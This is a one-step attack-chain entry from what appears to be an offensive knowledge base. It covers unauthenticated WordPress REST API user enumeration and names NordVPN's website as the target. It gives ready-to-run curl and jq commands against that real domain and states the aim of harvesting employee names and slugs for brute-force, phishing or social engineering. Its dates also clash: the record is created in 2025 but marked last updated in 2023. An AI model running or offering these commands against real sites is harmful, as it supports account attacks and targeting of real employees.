---
tags:
  - information-disclosure
  - wordpress
  - api
  - enumeration
  - reconnaissance
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-wordpress-users-api]]'
platforms:
  - Web
complexity: low
procedures:
  - '[[procedures/Enumerate-WordPress-Users-via-REST-API]]'
step_count: 1
techniques:
  - '[[Account Discovery]]'
description: >-
  Attack chain exploiting unauthenticated access to WordPress REST API endpoints
  to enumerate user details, enabling further attacks like brute-force or social
  engineering.
skill_level: beginner
impact_level: medium
id: 947773ac-8e6c-4d12-b87c-1827087e2ec3
created_at: '2025-12-14T17:25:18.106Z'
updated_at: '2025-12-14T17:25:18.106Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Unauthenticated WordPress REST API User Enumeration for Information Disclosure

## Overview

This attack chain demonstrates how attackers can exploit misconfigured WordPress REST API endpoints to disclose sensitive user information without authentication. By directly querying the /wp-json/wp/v2/users/ endpoint, an attacker retrieves a JSON list of all registered users, including IDs, names, slugs, descriptions, and avatar URLs. This exposure occurred on NordVPN's website, allowing enumeration of users and employees, which could facilitate brute-force login attempts, targeted phishing, or social engineering attacks. The vulnerability stems from the default enabling of the REST API without access controls.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance] --> B[Information Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-wordpress-users-api]] (or any HTTP client like wget or a browser)

### Target Environment

- WordPress-based website with REST API enabled (default in WP 4.7+)
- No authentication required for /wp/v2/users endpoint
- Publicly accessible web server

### Initial Access Requirements

- Internet access to the target URL
- No credentials or prior access needed

## Detailed Attack Procedures

### Step 1: Enumerate Users via REST API
procedure: [[procedures/Enumerate-WordPress-Users-via-REST-API]]

**Objective**: Retrieve a complete list of user details from the WordPress site to identify potential targets for further exploitation.

**Instructions**: Use [[commands/curl-wordpress-users-api]] to send a GET request to the vulnerable endpoint and capture the JSON response containing user data.

```bash
curl https://nordvpn.com/wp-json/wp/v2/users/
```

Alternatively, access via query parameter:

```bash
curl "https://nordvpn.com/?rest_route=/wp/v2/users/"
```

Parse the output for user IDs, names, slugs, descriptions, and avatars using tools like jq if needed:

```bash
curl https://nordvpn.com/wp-json/wp/v2/users/ | jq '.[].name'
```

**Expected Output**: JSON array of user objects, e.g., {"id":123,"name":"User Name","slug":"user-slug","description":"User bio","avatar_urls":{"24":"https://..."}}.

**Success Indicators**:
- JSON response with user data returned (no 401/403 errors)
- Multiple user entries listed, confirming enumeration
- No authentication prompt

## Attack Chain Summary

### Key Achievements

1. Successful disclosure of all registered user details without authentication
2. Identification of employee and user accounts for targeted attacks
3. Potential setup for brute-force or phishing based on exposed slugs and names

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01*
